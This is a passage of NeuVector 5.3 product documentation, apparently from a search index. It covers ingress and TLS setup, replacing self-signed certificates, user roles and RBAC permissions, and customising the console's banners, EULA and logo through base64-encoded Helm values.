annotation for the ingress address from ingress.mycloud.net to your appropriate address.  This example uses the URL cloud.neuvector.com. After the ingress service is created, you can find it's external IP. You then can configure the hosts file to point cloud.neuvector.com to that IP. After that, you should be able to browse to https://cloud.neuvector.com (the url you choose to use).  Using SSL Passthrough Instead of Redirect​  To use TLS/SSL passthrough instead of the redirect example above (supported on some ingress controllers such as nginx), make sure the ingress controller is configured appropriated for passthrough, and the appropriate annotation is added to the ingress. For example,   annotations: ingress.kubernetes.io/ssl-passthrough: &quot;true&quot;   ","version":"5.3","tagName":"h3"},{"title":"Replacing the NeuVector Self-signed Certificates​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/configuration/console#replacing-the-neuvector-self-signed-certificates","content":" Please see the next section Replacing the Self-Signed Certificates for details. The certificate must be replaced in both the Manager and Controller/Allinone yamls.  ","version":"5.3","tagName":"h3"},{"title":"Configuring AWS ALB with Certificate ARN​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/configuration/console#configuring-aws-alb-with-certificate-arn","content":" Here is a sample ingress configuration using the AWS load balancer with the certificate ARN (actual ARN obfuscated).  apiVersion: extensions/v1beta1 kind: Ingress metadata: annotations: # https://kubernetes-sigs.github.io/aws-alb-ingress-controller/guide/ingress/annotation/#healthcheck-path alb.ingress.kubernetes.io/backend-protocol: HTTPS alb.ingress.kubernetes.io/certificate-arn: arn:aws:acm:us-west-2:596810101010:certificate/380b6abc-1234-408d-axyz-651710101010 alb.ingress.kubernetes.io/healthcheck-path: / alb.ingress.kubernetes.io/healthcheck-protocol: HTTPS alb.ingress.kubernetes.io/listen-ports: '[{&quot;HTTPS&quot;:443}]' alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/success-codes: &quot;301&quot; alb.ingress.kubernetes.io/target-type: instance external-dns.alpha.kubernetes.io/hostname: eks.neuvector.com kubernetes.io/ingress.class: alb labels: app: neuvector-webui-ingress name: neuvector-webui-ingress namespace: neuvector spec: tls: - hosts: - eks.neuvector.com rules: - http: paths: - backend: serviceName: neuvector-service-webui servicePort: 8443 path: /*  ","version":"5.3","tagName":"h3"},{"title":"Replacing Self-Signed Certificate","type":0,"sectionRef":"#","url":"/configuration/console/replacecert","content":"","keywords":"","version":"5.3"},{"title":"Replacing the Self-Signed Certificate with PKCS Certificate for External Access​","type":1,"pageTitle":"Replacing Self-Signed Certificate","url":"/configuration/console/replacecert#replacing-the-self-signed-certificate-with-pkcs-certificate-for-external-access","content":" The built-in self-signed certificate used for external access from a browser to the Manager or for the REST API to the Controller can be replaced by a supported PKCS certificate. These should be replaced in both the Manager and Controller deployments. Note: To replace the included certificates for Internal communication between the Controller, Enforcer, and Scanner, please see this section.  The NeuVector web console supports 2 different self-signed certificate types, specifically, the PKCS8 (Private-Key Information Syntax Standard) and PKCS1 (RSA Cryptography Standard). The self-signed certificate can be replaced with either of these PKCS types.  The steps to generate the secret that will be consumed by NeuVector’s web console originating from the key and certificate using either of the PKCS methods will be illustrated below. The important note here is, with the use of the wildcard for the DNS as being part of the alternate-subject-name parameter during the key and certificate creation, this enables the name of your choosing to be mapped to the Management console IP-Address without restricting to a particular CN.  Generate and Use Self-signed Certificate PKCS8 or PCKS1​  Create a key and certificate  PKCS8​  openssl req -x509 -nodes -days 730 -newkey rsa:2048 -keyout tls.key -out tls.pem -config ca.cfg -extensions 'v3_req' Sample ca.cfg [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = California L = San Jose O = NeuVector Inc. OU = Neuvector CN = Neuvector [v3_req] keyUsage = keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1 = *   PKCS1​  openssl genrsa -out tls.key 2048 openssl req -x509 -nodes -days 730 -config openssl.cnf -new -key tls.key -out tls.pem Sample openssl.cnf [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = California L = San Jose O = NeuVector Inc. OU = Neuvector CN = Neuvector(PKCS#1) [v3_req] keyUsage = keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1 = *   Create the secret from the generated key and certificate files from above  kubectl create secret generic https-cert -n neuvector --from-file=tls.key --from-file=tls.pem   Edit the yaml directly for the manager and controller deployments to add the mounts  spec: template: spec: containers: volumeMounts: - mountPath: /etc/neuvector/certs/ssl-cert.key name: cert readOnly: true subPath: tls.key - mountPath: /etc/neuvector/certs/ssl-cert.pem name: cert readOnly: true subPath: tls.pem volumes: - name: cert secret: defaultMode: 420 secretName: https-cert   Or update with the helm chart with similar values.yaml  manager: certificate: secret: https-cert keyFile: tls.key pemFile: tls.pem ingress: enabled: true host: %CHANGE_HOST_NAME% ingressClassName: &quot;&quot; path: &quot;/&quot; # or this could be &quot;/api&quot;, but might need &quot;rewrite-target&quot; annotation annotations: ingress.kubernetes.io/protocol: https tls: true secretName: https-cert controller: certificate: secret: https-cert keyFile: tls.key pemFile: tls.pem   Then update with helm upgrade -i neuvector .... For reference here are all the values https://github.com/neuvector/neuvector-helm/tree/master/charts/core.  Support chained certificates​  To support End-to-end TLS, some ingresses/Application Gateways will only support backend servers that can be trusted. NeuVector added support for chained certificates in version 3.2.2. Microsoft's Application Gateway is one example of an Application Gateway requiring a chained certificate when using a not well-known CA.  To add a chained certificate, the example tls.pem file should be a concatenation of the certificates. ","version":"5.3","tagName":"h3"},{"title":"Users and Roles","type":0,"sectionRef":"#","url":"/configuration/users","content":"","keywords":"","version":"5.3"},{"title":"Configuring Users and Custom Roles​","type":1,"pageTitle":"Users and Roles","url":"/configuration/users#configuring-users-and-custom-roles","content":" The Settings -&gt; Users and Roles menu enables management of users as well as roles. Each user is assigned to a predefined or custom role. Users can be mapped to roles through group integration with LDAP/AD or other SSO system integrations. See the Enterprise Integration section for detailed instructions for each type or directory or SSO integration.  Users​  Users can be configured directly in NeuVector or integrated through directories/SSO. To create a new user in NeuVector go to Settings -&gt; Users &amp; Roles and add the user. Select the role of the user from the predefined roles, or see below to create a custom role.  The default password requirement is minimum 8 characters length, 1 uppercase letter, 1 lowercase letter, 1 numeric character. These and other requirements can be changed by an admin in Settings -&gt; Users under Authentication and Security Policies.  Namespace Restricted Users​  Users can be restricted to certain namespaces. First select the global role (use 'none' if no global role is desired), then click on the Advanced Settings.  Select a role name from the list of roles, then enter the namespace(s) which the user allowed. For example, below is a global reader (view only) role, but for namespace 'demo' the user has admin permissions and for the namespace 'staging' the user has CI/Ops permissions. If a custom role was previously configured that can also be selected.    note If a user has previously logged in through an enterprise integration, their Identify Provider (e.g. OpenID Connect) will be listed. A user can be promoted to a Federated admin if multi-cluster management is in use by selecting the user and editing.  note When a namespace restricted user configures a registry in Assets in NeuVector, only users with access to that namespace can see/scan that registry. Global users will be able to see/manage that registry, but not any users with restricted namespaces / role.  Roles​  Preconfigured roles include Admin, Reader, and CI/Ops. To create a new custom role, select the Roles tab in Settings -&gt; Users &amp; Roles. Name the role and add the appropriate read or write permission to it.    RBAC Permissions​  Admission Control. Manage admission control rules.Audit Events. View Notification -&gt; Risk reports logs.Authentication. Enable directory and SSO (oidc/saml/ldap) configuration.Authorization. Create new users and custom roles.CI Scan. Allows scanning on images through REST API. Useful for configuring a build-phase plug-in scanner user.Compliance. Create custom compliance scripts and review Compliance check results.Event. Access Notifications -&gt; Events logs.Registry Scan. Configure registry scanning and view results.Runtime Policy. Manage Policy menus for Policy Mode (Discover, Monitor, Protect), Network Rules, Process Rules, File Access Rules, DLP, Packet capture, Response Rules.Runtime Scan. Trigger and view run-time vulnerability scanning of containers/nodes/platform.Security Event. Access Notifications -&gt; Security Events logs.System Config. Allow configuration of Settings -&gt; Configuration.  Mapping Groups to Roles and Namespaces​  Groups can be mapped to preset or custom roles in NeuVector. In addition, a role can be restricted to one or more namespaces.  In the LDAP/AD, SAML, or OIDC configuration in Settings, the last section of the configuration screen maps Groups to Roles and Namespaces. First select a default role, if any, for mapping.    To map a group to a role and namespace, click Add to create a new mapping. Select a global role or none. If admin or FedAdmin is selected, this gives write access to all namespaces. If a different role is selected, it can be further restricted by selecting the desired namespace(s).    The following example provides some possible mappings. Demo_admin can read/view all namespaces but has admin rights to the demo and demo2 namespaces. System_admin only has admin rights to the kube-system namespace. And fed_admins has the preset fedAdmin role which gives write access to all resources across multiple clusters.    important If the user is in multiple groups, the role will be 'first matched' in the order listed and group's role assigned. Please adjust the order of configuration for proper behavior by dragging and dropping the mappings to the appropriate order in the list.  Multi-Cluster FedAdmin and Admin Roles for Primary and Remote Management​  When a cluster is promoted to be a Primary cluster, the admin becomes a FedAdmin automatically. The FedAdmin can perform operations on the primary such as generate a federation token for connecting a remote cluster as well as creating federated security rules such as network, process, file, and admission control rules.  Multi-cluster management roles are as follows:  On any cluster, a local admin or a Rancher SSO admin can promote the cluster to become a primary.Ldap/SSO/SAML/OIDC users with admin roles are not able to promote a cluster to primary.Only the FedAdmin can generate the token required to join a remote cluster to the primary.Any admin, including ldap/sso/saml/oidc users can join a remote cluster to the primary if they have the token.Only the FedAdmin can create a new user as a FedAdmin (or FedReader) or assign the FedAdmin (or FedReader) role to an existing user (including ldap/sso/saml/oidc users). ","version":"5.3","tagName":"h3"},{"title":"Deployments of the NeuVector Containers, Services, and Required Configurations","type":0,"sectionRef":"#","url":"/deploying","content":"Deployments of the NeuVector Containers, Services, and Required Configurations Topics for planning and deploying for testing and to production on various platforms using Kubernetes, Rancher, OpenShift, &amp; Docker compose.","keywords":"","version":"5.3"},{"title":"Custom Login, Header and Footer","type":0,"sectionRef":"#","url":"/configuration/customui","content":"","keywords":"","version":"5.3"},{"title":"Customizing the Console (UI) Component​","type":1,"pageTitle":"Custom Login, Header and Footer","url":"/configuration/customui#customizing-the-console-ui-component","content":" This guide will help you customize the console with the following options:  1. Customize the Login Logo​  To customize the login logo, follow these steps:  Create a 300x80 pixels SVG file.Base64 encode the SVG file.Save the encoded file to the environment variable CUSTOM_LOGIN_LOGO.  2. Customize the Acceptance Policy (e.g. Terms of Use)​  To customize the policy, follow these steps:  The policy content can be plain HTML or text.Base64 encode the policy content.Save the encoded content to the environment variable CUSTOM_EULA_POLICY.  3. Customize the Page Banner (Shown on every page)​  To customize the page banner, follow these steps:  Header Customization​  Customize the header's content and color.The color of the header banner is required.The color value can be a color keyword (e.g., yellow) or a Hex value (e.g., #ffff00).The content is optional and can be one line of plain HTML or text with a maximum of 120 characters.Base64 encode the header content.Save the encoded content to the environment variables CUSTOM_PAGE_HEADER_COLOR and CUSTOM_PAGE_HEADER_CONTENT.  Footer Customization​  Customize the footer's content and color.The color of the footer banner will be the same as the header banner if the color is not customized.The content is optional and can be one line of plain HTML or text with a maximum of 120 characters.Base64 encode the footer content.Save the encoded content to the environment variables CUSTOM_PAGE_FOOTER_COLOR and CUSTOM_PAGE_FOOTER_CONTENT.  The environment variables (CUSTOM_LOGIN_LOGO, CUSTOM_EULA_POLICY, CUSTOM_PAGE_HEADER_COLOR, CUSTOM_PAGE_HEADER_CONTENT, CUSTOM_PAGE_FOOTER_COLOR, CUSTOM_PAGE_FOOTER_CONTENT) can be defined in the values.yaml file in the helm chart. The corresponding section in the values.yaml file where these variables can be defined is &quot;manager.env.envs&quot;  4. Example to customize the UI pages using helm chart​  Prerequisites​  Before customizing the UI component, ensure that you have the following:  NeuVector Helm chart repository: https://github.com/neuvector/neuvector-helmNeuVector installed on your Kubernetes cluster  Steps​  Follow these steps to customize the UI component:  Locate the NeuVector Helm chart repository in your local environment: https://github.com/neuvector/neuvector-helm.Navigate to the neuvector-helm/charts/core directory.Edit the manager.env.envs in the values.yaml to add the environment variables. CUSTOM_PAGE_HEADER_COLOR: Set the banner color to DarkOrange (#ff8c00).CUSTOM_PAGE_HEADER_CONTENT: Specify the header text using a plain HTML or text, for example &quot;You are accessing a U.S. Government (USG) Information System (IS) that is provided for USG-authorized use only.&quot;, remember to based64 encode it.CUSTOM_EULA_POLICY: Customize the policy content using a plain HTML snippet or text and remember to base64 encode it.CUSTOM_LOGIN_LOGO: Customize the logo with a 300x80 pixel svg file and base64 encode it  manager: # If false, manager will not be installed enabled: true image: repository: nvpublic/ma hash: priorityClassName: env: ssl: true envs: - name: CUSTOM_PAGE_HEADER_COLOR value: &quot;#ff8c00&quot; - name: CUSTOM_PAGE_HEADER_CONTENT value: WW91IGFyZSBhY2Nlc3NpbmcgYSAmbmJzcDs8Yj4gVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIDwvYj4gICAgICB0aGF0IGlzIHByb3ZpZGVkIGZvciBVU0ctYXV0aG9yaXplZCB1c2Ugb25seS4= - name: CUSTOM_EULA_POLICY value: PGg0PgogIFlvdSBhcmUgYWNjZXNzaW5nIGEgVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIHRoYXQgaXMgcHJvdmlkZWQgZm9yIFVTRy1hdXRob3JpemVkIHVzZSBvbmx5LgpCeSB1c2luZyB0aGlzIElTICh3aGljaCBpbmNsdWRlcyBhbnkgZGV2aWNlIGF0dGFjaGVkIHRvIHRoaXMgSVMpLCB5b3UgY29uc2VudCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CjwvaDQ+CjxwPgotVGhlIFVTRyByb3V0aW5lbHkgaW50ZXJjZXB0cyBhbmQgbW9uaXRvcnMgY29tbXVuaWNhdGlvbnMgb24gdGhpcyBJUyBmb3IgcHVycG9zZXMgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHBlbmV0cmF0aW9uIHRlc3RpbmcsIENPTVNFQyBtb25pdG9yaW5nLCBuZXR3b3JrIG9wZXJhdGlvbnMgYW5kIGRlZmVuc2UsIHBlcnNvbm5lbCBtaXNjb25kdWN0IChQTSksIGxhdyBlbmZvcmNlbWVudCAoTEUpLCBhbmQgY291bnRlcmludGVsbGlnZW5jZSAoQ0kpIGludmVzdGlnYXRpb25zLgo8L3A+CjxwPgotQXQgYW55IHRpbWUsIHRoZSBVU0cgbWF5IGluc3BlY3QgYW5kIHNlaXplIGRhdGEgc3RvcmVkIG9uIHRoaXMgSVMuCjwvcD4K - name: CUSTOM_LOGIN_LOGO value: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="80" xml:space="preserve" version="1.1" viewBox="0 0 300 80">
    <image width="300" height="80" xlink:href="data:image/png;base64,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"/>
  </svg>

   Run the following command in the neuvector-helm/charts/core to upgrade the NeuVector Helm chart:  helm upgrade neuvector -n neuvector ./   This will apply the customization changes to the UI pages.  ","version":"5.3","tagName":"h3"},{"title":"Verification​","type":1,"pageTitle":"Custom Login, Header and Footer","url":"/configuration/customui#verification","content":" To verify that the environment variables have been successfully set, you can run the following command:  kubectl get deployment -n neuvector neuvector-manager-pod -o yaml   Check the spec.template.spec.containers.env section to ensure that the desired environment variables are present.  spec: progressDeadlineSeconds: 600 replicas: 1 revisionHistoryLimit: 10 selector: matchLabels: app: neuvector-manager-pod strategy: rollingUpdate: maxSurge: 25% maxUnavailable: 25% type: RollingUpdate template: metadata: creationTimestamp: null labels: app: neuvector-manager-pod release: neuvector spec: containers: - env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector - name: CUSTOM_PAGE_HEADER_COLOR value: '#ff8c00' - name: CUSTOM_PAGE_HEADER_CONTENT value: WW91IGFyZSBhY2Nlc3NpbmcgYSAmbmJzcDs8Yj4gVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIDwvYj4gICAgICB0aGF0IGlzIHByb3ZpZGVkIGZvciBVU0ctYXV0aG9yaXplZCB1c2Ugb25seS4= - name: CUSTOM_EULA_POLICY value: 